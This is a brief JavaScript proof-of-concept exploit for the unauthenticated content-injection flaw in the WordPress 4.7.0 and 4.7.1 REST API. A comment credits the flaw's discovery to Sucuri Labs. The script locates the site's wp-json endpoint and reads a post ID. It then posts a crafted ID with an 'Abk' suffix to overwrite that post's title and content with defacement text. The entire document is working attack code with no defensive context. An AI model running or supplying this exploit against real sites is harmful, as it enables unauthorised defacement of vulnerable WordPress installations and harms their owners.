// a quick and dirty poc for the unauthenticated content injection sucuri labs found in WP 4.7.(0|1)

var api = document.querySelectorAll("link[rel='https://api.w.org/']")[0].href;
console.log('[+] Got wp-json endpoint .. [ ' + api + ' ]');
var pID = getpID(api + 'wp/v2/posts');
console.log('[+] Got the post id .. [ ' + pID + ' ]');

var content  = '~ Khan';
var json     = {"id": pID + "Abk", "title": "( ͡° ͜ʖ ͡°)", "content": content};
var response = postVector(api + 'wp/v2/posts/' + pID, JSON.stringify(json));
console.log(response);

function getpID(api) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', api, false);
    xhr.send(null);
    return JSON.parse(xhr.responseText)[0].id;
}
function postVector(url, json) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, false);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.onreadystatechange = function () { 
        if (xhr.readyState == 4 && xhr.status == 200) {
            console.log('[+] Post at [ ' + JSON.parse(xhr.responseText).link + ' ]');
        }
        else {
            console.log('[+] Not vulnerable! [ ' + xhr.status + ' ]');
        }
    };
    xhr.send(json);
}